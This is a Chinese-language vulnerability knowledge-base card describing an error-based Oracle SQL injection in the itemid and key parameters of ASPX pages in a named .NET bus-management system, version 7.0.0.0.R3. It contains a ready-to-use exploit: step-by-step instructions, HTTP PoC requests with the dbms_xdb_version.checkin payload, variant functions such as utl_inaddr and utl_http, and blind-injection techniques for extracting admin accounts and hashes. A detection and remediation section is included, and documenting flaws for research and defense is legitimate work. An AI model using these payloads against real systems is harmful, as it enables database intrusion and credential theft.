---
id: web-generic-sqli-dotnet-oracle-error-dbms-xdb-checkin
title: .NET 参数直拼 Oracle 查询：itemid/key 用 dbms_xdb_version.checkin(user) 报错注入
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-oracle-error-based-dbms-xdb-injection
tags:
- sqli
- oracle
- dotnet
- error-based
- dbms-xdb
- aspx
- cve-less
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: 7.0.0.0.R3
verification:
  verified_by: verifier-V35
  verified_at: '2026-11-05T06:03:42+08:00'
  notes: 已对照原文核对：itemid 直拼 hr_trainplan_view、key 经 string.Format 拼 d.workorderguid；-1'||dbms_xdb_version.checkin(user)||' 触发 ORA-31001，错误页回显 SQL/堆栈/机器名，截图可证。未在本机复现。
url: /docs/web/generic/sqli/web-generic-sqli-dotnet-oracle-error-dbms-xdb-checkin/
draft: false
kb_aliases:
- Oracle 报错注入
- dbms_xdb_version.checkin
- ORA-31001 注入
- itemid SQL 注入
- key SQL 注入
- 海信智能公交 SQL 注入
---

## 一句话结论

某 .NET + Oracle 公交管理系统的 ASPX 页面把请求参数直接拼进 SQL：`YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx` 的 `itemid` 进入 `select * from hr_trainplan_view where trainplanitemid='<itemid>'`，`YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx` 的 `key` 经 `string.Format` 进入 `d.workorderguid` 条件；两个参数都可用 Oracle 的 `dbms_xdb_version.checkin(user)` 触发 `ORA-31001`，错误页回显完整 SQL 与数据库用户，构成无需回显位的报错注入。

## 原理

- 第一处：`ArrangeCourse_Mng` 的 `Page_Load` 读取 `Request.Params["itemid"]`，赋值给 `itemid` 后调用 `LoadInfo(itemid)`；`LoadInfo` 中 `string sql = "select * from hr_trainplan_view where trainplanitemid='" + itemid + "'"`，随后 `dal.DB.GetDataTable(sql)`。`Request.Params` 同时接受 query、form、cookie 等来源，且没有参数化。
- 第二处：`AddMaintainReport` 读取 `tid` 与 `key`，`key` 的值赋给 `strWorkreportno`，再通过 `string.Format` 拼到 `d.workorderguid` 条件中；同样未过滤、未参数化。
- Oracle 报错注入原语：把 `-1'||dbms_xdb_version.checkin(user)||'` 拼进单引号字符串后，SQL 变为 `... where trainplanitemid='-1'||dbms_xdb_version.checkin(user)||''`；`dbms_xdb_version.checkin` 接收资源路径参数，传入 `user`（或任意字符串）会因资源不存在/路径非法抛 `ORA-31001: 资源句柄或路径名 "..." 无效`。错误信息中会带上传入值，且 .NET 的未处理异常页会把完整 SQL、堆栈、错误码、时间、机器名、UserID 一起回显。
- 为什么能拿数据：把 `user` 替换为任意子查询/表达式（受 Oracle 类型与函数要求限制）即可让表达式结果出现在错误文案里；即使只能报错，也可先用 `user` 确认注入，再结合 `dbms_xdb_version` 系列函数或其它报错函数逐段带出数据。
- 根因是“字符串拼接构造 SQL + 数据库错误信息原样返回前端”两个条件叠加：前者让输入进入语法层，后者提供了带外/回显通道。

## 触发条件

- 目标为该公交管理系统 7.0.0.0.R3（文章标记的影响版本）。
- `ArrangeCourse_Mng.aspx` 或 `AddMaintainReport.aspx` 可访问，参数 `itemid`/`key` 可达（文章用 GET/POST 均可，`Request.Params` 合并来源）。
- 数据库为 Oracle，`dbms_xdb_version` 包可用（普通用户通常可执行；权限不足会报另一类错误，仍可能回显）。
- 应用未关闭详细错误页（文章截图显示 FlowPortal.net 错误报告页，含完整 SQL 与堆栈）。

## 利用步骤

1. 访问 `ArrangeCourse_Mng.aspx?itemid=1'`，观察是否出现 SQL 语法错误/异常页，确认注入点。
2. 用报错原语确认执行：`itemid=-1'||dbms_xdb_version.checkin(user)||'`；错误页出现 `ORA-31001`，并在错误文本/SQL 中看到当前数据库用户。
3. 对 `AddMaintainReport.aspx` 重复：`key=-1'` 触发语法错误，`key=-1'||dbms_xdb_version.checkin(user)||'` 触发 `ORA-31001`。
4. 按需把 `user` 换成其它表达式/子查询，或改用其它 Oracle 报错函数（`ctxsys.drithsx.sn`、`utl_inaddr.get_host_name` 等，视权限与版本），逐段带出表名、列名、管理员账号/哈希。
5. 记录错误页中的 SQL 与堆栈，确认查询上下文（表名、字段、数据库用户），再决定是否扩大利用。

## PoC

```http
### 第一处：itemid（POST form 或 GET 均可，Request.Params 合并）
POST /YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx?relationid=1 HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

itemid=1'

### 报错注入（确认数据库用户）
GET /YZSoft/Forms/XForm/HR/TrainOnline/ArrangeCourse_Mng.aspx?itemid=-1%27%7C%7Cdbms_xdb_version.checkin(user)%7C%7C%27 HTTP/1.1
Host: target

### 第二处：key
GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1%27 HTTP/1.1
Host: target

GET /YZSoft/Forms/XForm/BM/MaintainManagement/KS/AddMaintainReport.aspx?tid=&key=-1%27%7C%7Cdbms_xdb_version.checkin(user)%7C%7C%27 HTTP/1.1
Host: target
```

```text
拼接后的 SQL（第一处）：
select * from hr_trainplan_view where trainplanitemid='-1'||dbms_xdb_version.checkin(user)||''

错误页关键信息（文章截图）：
  ORA-31001: 资源句柄或路径名 "..." 无效
  Description: select * from hr_trainplan_view where trainplanitemid='-1'||dbms_xdb_version.checkin(user)||''
  ErrorType: TechError
  MachineName / UserID / ErrorTime 一并回显
  → 说明输入已进入 SQL 语法层，且数据库执行了 dbms_xdb_version.checkin

第二处拼接后：
select d.status from bm_workorderguid d where d.workorderguid='-1'||dbms_xdb_version.checkin(user)||''
同样触发 ORA-31001。

文章附错误页截图；本卡未在本机复现。
```

## 变体与关联

- 变体（报错函数）：`dbms_xdb_version.checkin`、`dbms_xdb_version.uncheckout`、`ctxsys.drithsx.sn`、`utl_inaddr.get_host_name`、`utl_http.request` 等，取决于 Oracle 版本与包权限；不同函数报错文案不同，但都能把表达式/子查询结果带入错误信息。
- 变体（注入位置）：`itemid` 位于单引号字符串内，需先闭合 `'`；`key` 经 `string.Format` 拼接，闭合方式相同；若参数被放进数字上下文则无需引号。
- 变体（盲注）：错误页被关闭时，可改用布尔条件（`and 1=1`/`and 1=2`）或时间函数（`dbms_pipe.receive_message`、`dbms_lock.sleep`）做盲注，`dbms_xdb_version` 报错只是其中一种。
- 关联：[[web-generic-sqli-error-based-extraction]] 是报错注入的通用方法；本卡是其 Oracle + .NET 的具体落点与 `dbms_xdb_version.checkin` 原语。
- 边界：Oracle 错误页被定制为通用错误、或 `dbms_xdb_version` 包权限被回收时，报错链失效；参数若被 WAF 拦截 `'`/`||` 需换编码或函数；非 Oracle 数据库不适用。

## 检测与防御

- 请求检测：`itemid`/`key` 等参数出现单引号、`||`、`dbms_xdb_version`、`checkin(`、`user`、`ORA-`、`utl_inaddr`、`ctxsys`；同一参数先发 `'` 再发报错函数的探测序列；错误页响应中出现完整 SQL 语句。
- 主机检测：数据库日志出现 `ORA-31001`、`ORA-00933` 等由拼接引发的语法/资源错误；应用日志记录完整 SQL 与堆栈并返回给客户端；Web 服务器错误页含 `Description: select ...`。
- 修复：所有 SQL 使用参数化查询（`OracleCommand.Parameters`/`DbParameter`），`itemid`、`key` 一律作为绑定值；禁止字符串拼接与 `string.Format` 构造 SQL。
- 修复：关闭生产环境详细错误页，统一返回通用错误码；Oracle 侧回收 `dbms_xdb_version`、`utl_inaddr`、`utl_http` 等包的 PUBLIC 执行权限。
- 加固：数据库账号最小权限；WAF 拦截 SQL 关键字/函数与异常引号组合；对 ASPX 参数做类型/长度白名单（如 itemid 只允许数字）。
- 审计：搜索 `Request.Params[`、`Request.QueryString[`、`Request.Form[` 后紧跟字符串拼接 SQL 的代码；检查 `string.Format("... {0} ...")` 中是否嵌入用户输入；检查错误页配置（`customErrors`/`httpErrors`）。
